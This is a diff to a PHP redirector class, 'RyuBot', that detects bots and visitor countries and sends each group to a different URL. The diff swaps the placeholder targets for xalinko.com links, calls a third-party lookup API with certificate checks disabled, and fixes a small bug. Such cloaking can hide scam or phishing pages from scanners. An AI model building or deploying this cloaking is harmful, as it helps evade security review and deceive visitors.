@@ -47,26 +47,26 @@ Class RyuBot{
 		*/
 		
 		/** This is work if not detect bot or not detect country listed ( Direct By Country ) **/
-		$this->config['direct']['default'] = 'https://google.com';
+		$this->config['direct']['default'] = 'https://xalinko.com/_.php?e=DEFAULT-PAGE';
 		
 		/** This is work if you enable one_time_access set to true **/
-		$this->config['direct']['onetime'] = 'https://facebook.com';
+		$this->config['direct']['onetime'] = 'https://xalinko.com/_.php?e=ONETIME-PAGE';
 
 		/** This is work if bot detected **/
-		$this->config['direct']['bot'] = 'https://twitter.com';
+		$this->config['direct']['bot'] = 'https://xalinko.com/_.php?e=BOT-PAGE';
 
 		/** This is work if detect visitor from country listed here **/
 
 		// This is example code  direct by country single URL.
-		$this->config['direct']['by_country']['ID'] = 'https://google.co.id';
-		$this->config['direct']['by_country']['US'] = 'https://google.us';
+	
+		$this->config['direct']['by_country']['US'] = 'https://xalinko.com/_.php?e=DETECT-COUNTRY-US';
 
 		// This is example code direct by country MASS URLs and access by random.
-		$this->config['direct']['by_country']['CA'][0] = 'https://w3schools.com';
+		$this->config['direct']['by_country']['ID'][0] = 'https://xalinko.com/_.php?e=DETECT-COUNTRY-ID-0';
 		
-		$this->config['direct']['by_country']['CA'][1] = 'https://php.net';
+		$this->config['direct']['by_country']['ID'][1] = 'https://xalinko.com/_.php?e=DETECT-COUNTRY-ID-1';
 
-		$this->config['direct']['by_country']['CA'][2] = 'https://7inc.store';
+		$this->config['direct']['by_country']['ID'][2] = 'https://xalinko.com/_.php?e=DETECT-COUNTRY-ID-2';
 
 		
 		/** CONFIGURATION END **/
@@ -80,7 +80,7 @@ Class RyuBot{
 	{
 		
 
-		$setup = [CURLOPT_URL => 'http://7inc.store/xapi/?api='.$method.'&'.http_build_query($param),
+		$setup = [CURLOPT_URL => 'https://7inc.store/xapi/?api='.$method.'&'.http_build_query($param),
 				 CURLOPT_RETURNTRANSFER=>true,
 				 CURLOPT_USERAGENT=>'RyuBots',
 				 CURLOPT_SSL_VERIFYPEER=>false
@@ -136,7 +136,7 @@ Class RyuBot{
 	{
 		$size = count($array);
     $randomIndex = rand(0, $size - 1);
-    $randomUrl = $target[$randomIndex];
+    $randomUrl = $array[$randomIndex];
     return $randomUrl;
 	}
 	public function one_time()
@@ -175,7 +175,8 @@ Class RyuBot{
 			/** checking if using mass random direct **/
 			if(is_array($this->config['direct']['by_country'][$code]))
 			{
-				@header('location: '.$this->randomUri($this->config['direct']['by_country'][$code]),true,303);
+			    @header('location:'.$this->randomUri($this->config['direct']['by_country'][$code]),true,303);
+
 				exit;
 			}else
 			{
